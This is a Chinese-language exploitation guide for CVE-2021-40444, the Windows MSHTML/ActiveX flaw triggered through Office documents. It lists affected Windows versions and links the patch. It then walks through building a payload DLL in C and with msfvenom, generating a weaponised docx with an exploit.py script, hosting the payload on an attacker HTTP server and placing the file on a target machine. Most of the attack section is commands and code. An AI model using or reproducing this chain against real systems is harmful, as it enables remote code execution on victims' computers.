### CVE-2021-40444

#### 描述

这个漏洞是IE浏览器的漏洞，但是offer相关组件默认使用的是IE浏览器，所以在offer相关组件禁用了ActiveX也一样可以执行

#### 影响版本

| Product             | CPU Architecture | Version | Update | Tested   |
| ------------------- | ---------------- | ------- | ------ | -------- |
| Windows 10          | x86/x64          |         |        |          |
| Windows 10          | x86/x64          | 1607    |        |          |
| Windows 10          | x86/x64/ARM64    | 1809    |        |          |
| Windows 10          | x86/x64/ARM64    | 1909    |        |          |
| Windows 10          | x86/x64/ARM64    | 2004    |        | &#10004; |
| Windows 10          | x86/x64/ARM64    | 20H2    |        |          |
| Windows 10          | x86/x64/ARM64    | 21H1    |        |          |
| Windows 7           | x86/x64          |         | SP1    |          |
| Windows 8.1         | x86/x64          |         |        |          |
| Windows Rt 8.1      |                  |         |        |          |
| Windows Server 2008 | x86/x64          |         | SP2    |          |
| Windows Server 2008 | x64              | R2      | SP1    |          |
| Windows Server 2012 |                  |         |        |          |
| Windows Server 2012 |                  | R2      |        |          |
| Windows Server 2016 |                  |         |        |          |
| Windows Server 2019 |                  |         |        |          |
| Windows Server 2022 |                  |         |        |          |
| Windows Server      |                  | 2004    |        |          |
| Windows Server      |                  | 20H2    |        |          |



#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-40444
```

#### 利用原理

根据之前在野利用样本`938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52`

可以知道，其实就是利用默认浏览器（IE）加载ActiveX

![image-20210911112944428](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-40444_Windows_10_2004_X64_1.png)

本质上恶意利用只需要修改样本中的`document.xml.rels`文件中框起来mhtml和x-usc这两段内容该为恶意目标网页，即可达到利用

#### 利用方式

首先需要生成一个恶意的DLL文件，通过msf或者自己编译都行

- 自己编译

  ```c
  //calc.c
  #include <windows.h>
  
  void exec(void) {
  	system("cmd /c calc");
  	return;
  }
  
  BOOL WINAPI DllMain(
      HINSTANCE hinstDLL,
      DWORD fdwReason, 
      LPVOID lpReserved )
  {
      switch( fdwReason ) 
      { 
          case DLL_PROCESS_ATTACH:
             exec(); 
             break;
  
          case DLL_THREAD_ATTACH:
              break;
  
          case DLL_THREAD_DETACH:
              break;
  
          case DLL_PROCESS_DETACH:
              break;
      }
      return TRUE;
  }
  ```

  然后运行命令

  ```
  i686-w64-mingw32-gcc -shared calc.c -o calc.dll
  ```

- 通过msf编译

  ```
  msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f dll>>calc.dll
  ```

> 最好使用MSF生成DLL文件！
>
> 还有请看准对应机器，有些Windows 10 版本不存在该问题

安装环境所需要的依赖`sudo apt-get install lcab`，生成 cab用的

接着使用一键化脚本，`test/calc.dll`这个为你生成的哪个dll所在的绝对路径，`http://you_ip`你启动exp这台机器的IP

```
cd CVE-2021-40444 ; python3 exploit.py generate test/calc.dll http://you_ip
```

![image-20210911115757383](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-40444_Windows_10_2004_X64_2.png)

然后启动http服务

```
cd srv ; python3 -m http.server 80
```

接着把生成的恶意docx文件（在`out/`文件夹中），放到目标机器上（Windows 10 2004 x64），即可执行成功

![1](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-40444_Windows_10_2004_X64_3.gif)

#### 参考项目

- [prcabral](https://github.com/prcabral/CVE-2021-40444)